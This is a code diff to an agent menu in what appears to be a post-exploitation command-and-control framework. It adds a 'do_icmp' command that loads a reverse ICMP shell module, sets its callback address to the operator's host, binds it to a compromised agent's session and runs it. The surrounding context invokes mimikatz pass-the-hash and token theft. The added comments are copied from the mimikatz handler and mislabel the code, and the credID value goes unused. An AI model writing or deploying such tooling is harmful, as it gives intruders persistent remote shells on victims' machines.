@@ -1869,6 +1869,25 @@ class AgentMenu(cmd.Cmd):
             l = ModuleMenu(self.mainMenu, "credentials/mimikatz/pth")
             l.do_execute("")
 
+    def do_icmp(self, line):
+        "Executes Reverse ICMP shell for backup."
+
+        credID = line.strip()
+
+        if self.mainMenu.modules.modules["management/rev_icmp_shell"]:
+            # reload the module to reset the default values
+            module = self.mainMenu.modules.reload_module("management/rev_icmp_shell")
+
+            module = self.mainMenu.modules.modules["management/rev_icmp_shell"]
+
+            # set mimikt/pth to use the given CredID
+            module.options['IPAddress']['Value'] = helpers.lhost()
+            # set the agent ID
+            module.options['Agent']['Value'] = self.mainMenu.agents.get_agent_name(self.sessionID)
+
+            # execute the mimikatz/pth module
+            l = ModuleMenu(self.mainMenu, "management/rev_icmp_shell")
+            l.do_execute("")
 
     def do_steal_token(self, line):
         "Uses credentials/tokens to impersonate a token for a given process ID."
